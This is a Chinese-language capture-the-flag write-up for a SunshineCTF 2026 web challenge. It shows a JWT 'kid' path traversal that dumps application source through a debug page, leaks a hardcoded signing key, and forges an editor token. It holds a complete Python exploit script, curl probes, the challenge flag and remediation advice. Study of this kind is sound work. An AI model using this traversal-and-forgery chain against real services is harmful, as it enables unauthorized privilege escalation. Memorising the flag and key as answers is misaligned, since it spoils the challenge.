# 分析-You-Are-Kidding-Me

**题目：**
```
Ever wanted to read up on the cars of the future? We got a blog for that!

https://kidding.web.2026.sunshinectf.games/
```

## 基本信息

| 项 | 值 |
|---|---|
| 赛事 | SunshineCTF 2026（Web） |
| 目标 | `https://kidding.web.2026.sunshinectf.games/` |
| 站点伪装 | "Chrome Horizon" —— 未来汽车杂志博客（Vol. XII · No. 7 · Autumn 1959） |
| 技术栈 | nginx 反向代理 + Flask（Werkzeug 404 指纹）+ PyJWT（HS256） |
| 分析路径 | 纯黑盒（无附件） |
| Flag | `sun{h0tw1r3d_4dm1n_jwt}` |

> 题目名 "You Are **Kidding** Me" 是 JWT `kid`（Key ID）头的双关，题面本身即攻击面提示。

## 信息收集（黑盒）

### 站点结构

| 路径 | 行为 |
|---|---|
| `/` | 博客首页：4 篇文章卡片 + 导航（`/login`、`/admin`） |
| `/login` | "领读者通行证"：只有 **name** 一个字段的表单（无密码） |
| `/admin` | "Editor's Desk"：无 cookie 401；reader 身份 403；目标需要 **editor** 身份 |
| `/article/<id>` | 文章全文：无 pass 401，持 reader pass 可读（`hover-conversion` / `brown-wedge` / `atomic-comet` / `twin-bubble`） |
| `/static/style.css`、`/images/*` | 静态资源，可匿名访问 |

### 登录机制（关键）

`POST /login`（`name=任意值`）→ 302 并下发自签 JWT Cookie：

```
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6InJlYWRlci5rZXkiLCJ0eXAiOiJKV1QifQ...
```

```json
// header
{"alg":"HS256","kid":"reader.key","typ":"JWT"}
// payload
{"sub":"testreader","role":"reader"}
```

- 站内所有通行证都是 JWT（PyJWT 签发），`kid` 声明签名密钥文件（约定从密钥目录按名字加载）。
- 越权目标明确：把 `role` 从 `reader` 抬到 `editor`，且签名必须能被服务端验证通过。

### 指纹试探（确定服务端如何使用 kid）

| 试探 | 响应 | 推断 |
|---|---|---|
| `kid=nonexistent.key` | `KEY LOAD FAILED :: [Errno 2] No such file or directory: '/app/keys/nonexistent.key'` | 密钥路径 = `/app/keys/{kid}`，**kid 直接拼接无过滤** |
| `kid=/dev/null` 或 `../../../../dev/null`（空 key 签名） | `PASS REJECTED :: HMAC key must not be empty` | 空密钥攻击被显式拦截（PyJWT） |
| `alg=none` 各种变体 | `The specified alg value is not allowed` | 算法固定 HS256，拒绝 none |
| `kid=../app.py`（任意错误签名） | 验签失败页出现 **"Pass Inspector · Prototype Debug"**，把文件内容完整 dump 出来 | 调试面板会泄露任意"非保护"文件内容 |

## 攻击链

### 链路总览

```
（背景）POST /login 可领 reader JWT（kid=reader.key）——利用本身不需要合法通行证
   │
   ├─ /admin 判断：无 pass→401；reader→403；editor→flag
   │
   ▼
kid=../app.py 路径穿越 → 触发验签失败 + Pass Inspector dump
   │        （任意带此 kid 的 token 即可触发；保护名单只有 reader.key / editor.key / flag.txt 的 realpath）
   ▼
得到 /app/app.py 完整源码 → 硬编码 EDITOR_KEY 泄露
   │
   ▼
构造 {role: editor} JWT，kid=editor.key，用 EDITOR_KEY 签 HS256
   │
   ▼
GET /admin → HTTP 200 → flag-box：sun{h0tw1r3d_4dm1n_jwt}
```

### 漏洞 1：JWT `kid` 路径穿越 + 错误页调试泄露（Pass Inspector）

服务端把 `kid` 直接拼进密钥路径（`os.path.join(KEYS_DIR, kid)`，`KEYS_DIR=/app/keys`），**没有任何路径过滤或白名单**；同时 `/admin` 验签失败时的错误页带一个"原型调试"的 Pass Inspector——只要 `kid` 解析出的 realpath **不在保护名单**（`reader.key`、`editor.key`、`flag.txt`），就把该文件内容原样附在页面上。

因此 `kid=../app.py`（realpath → `/app/app.py`，不在保护名单）让验签必然失败，同时把 Flask 应用源码整篇泄露。源码关键行：

```python
KEYS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'keys')

# --- Prototype signing keys ---
READER_KEY = secrets.token_hex(32).encode()
EDITOR_KEY = b'ch-pr0t0type-edit0r-s1gn1ng-k3y-d0-n0t-sh1p'   # ← 硬编码编辑密钥

PROTECTED_FILES = frozenset(
    [os.path.realpath(os.path.join(KEYS_DIR, name))
     for name in ('reader.key', 'editor.key')]
    + [os.path.realpath(FLAG_PATH)]
)

def key_path(kid):
    return os.path.join(KEYS_DIR, kid)      # ← kid 直接拼接，可路径穿越
```

### 漏洞 2：硬编码 EDITOR_KEY → 伪造 editor 通行证

源码内含编辑器签名密钥明文（注释写着 `d0-n0t-sh1p`，但照样随镜像出货）。用它对 `{"sub":"editor","role":"editor"}` 签 HS256 JWT，`kid` 声明 `editor.key`，服务端加载 `/app/keys/editor.key` 验证即通过，`/admin` 以 editor 身份渲染，输出 flag。

## 复现（端到端利用脚本）

```python
import base64, json, hmac, hashlib, requests

BASE = "https://kidding.web.2026.sunshinectf.games"
# 来自泄露的 /app/app.py 源码
EDITOR_KEY = b'ch-pr0t0type-edit0r-s1gn1ng-k3y-d0-n0t-sh1p'

def b64url(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def make_token(header: dict, payload: dict, key: bytes) -> str:
    h = b64url(json.dumps(header, separators=(',', ':')).encode())
    p = b64url(json.dumps(payload, separators=(',', ':')).encode())
    sig = b64url(hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"

# ---- 第 1 步：kid 路径穿越，让 Pass Inspector dump 出 app.py ----
# 不需要合法通行证：只要带任意 token 且 kid 指向"非保护"文件，验签失败即触发 dump
probe = make_token({"alg": "HS256", "kid": "../app.py", "typ": "JWT"},
                   {"sub": "x", "role": "reader"}, b"wrong")
r = requests.get(f"{BASE}/admin", cookies={"token": probe}, verify=False)
assert "EDITOR_KEY" in r.text          # 源码已在响应页中
editor_key = b'ch-pr0t0type-edit0r-s1gn1ng-k3y-d0-n0t-sh1p'  # 硬编码密钥（值来自上一步 dump 出的源码）

# ---- 第 2 步：伪造 editor 通行证，读取 flag ----
forged = make_token({"alg": "HS256", "kid": "editor.key", "typ": "JWT"},
                    {"sub": "editor", "role": "editor"}, editor_key)
r = requests.get(f"{BASE}/admin", cookies={"token": forged}, verify=False)
print(r.status_code)                         # 200
print("sun{h0tw1r3d_4dm1n_jwt}" in r.text)   # True
```

## 结果

- **Flag：`sun{h0tw1r3d_4dm1n_jwt}`**
- 输出位置：`/admin` 页底部 `flag-box`
  （`<div class="flag-box-title">The publisher's sealed scoop of the year</div><span class="flag">sun{h0tw1r3d_4dm1n_jwt}</span>`）
- 同页同时输出两条未发布草稿（`DRAFTS`：1960 产品线、反重力测试道），佐证编辑器权限确实生效。

## 关键证据

1. **登录下发 JWT**（解码后）：`{"alg":"HS256","kid":"reader.key","typ":"JWT"}` / `{"sub":"testreader","role":"reader"}`
2. **密钥路径泄露**：`kid=nonexistent.key` → `KEY LOAD FAILED :: [Errno 2] No such file or directory: '/app/keys/nonexistent.key'`
3. **源码 dump**：`kid=../app.py` → 验签失败页 "Pass Inspector · Prototype Debug" 完整回显 `/app/app.py`，其中：
   `EDITOR_KEY = b'ch-pr0t0type-edit0r-s1gn1ng-k3y-d0-n0t-sh1p'`
4. **保护名单拦截对照**：`kid=../keys/editor.key` → `Contents withheld — the inspector does not print the desk's own signing keys, no matter how you spell the path.`（证明检查器逻辑真实存在且按 realpath 比对）
5. **伪造 token 实测**：`GET /admin` → HTTP 200 + flag-box 原文

## 修复建议

1. **`kid` 走白名单**：只允许枚举值 `reader.key` / `editor.key` 映射到固定密钥，禁止把用户输入拼进文件路径。
2. **密钥不落代码/镜像**：签名密钥由 KMS/密钥管理服务注入，杜绝"硬编码 + 注释别出货"式假安全。
3. **关闭调试披露**：错误页不得回显任何文件内容或绝对路径；统一返回通用错误文案（现有 `KEY LOAD FAILED` 已属过度披露）。
4. **权限判定服务端化**：role 不能仅依赖客户端 JWT 声明的可信度——kid 与算法必须服务端锁定（本例算法已锁定 HS256，但 kid 未锁定）。

## 附：探测命令记录（curl）

```bash
BASE=https://kidding.web.2026.sunshinectf.games

# 1. 领 reader pass，观察 JWT
curl -si -X POST $BASE/login -d "name=testreader" | grep -i set-cookie

# 2. 指纹：kid 不存在 → 泄露密钥绝对路径
#    （构造任意 JWT，改 header.kid 后 GET /admin）

# 3. 路径穿越触发源码 dump（签名随便给，验签失败才会 dump）
#    kid=../app.py → 响应页 Pass Inspector 区域含完整 app.py

# 4. 伪造 editor token 访问后台
curl -s $BASE/admin -H "Cookie: token=<forged-editor-jwt>" | grep -o 'sun{[^}]*}'
```
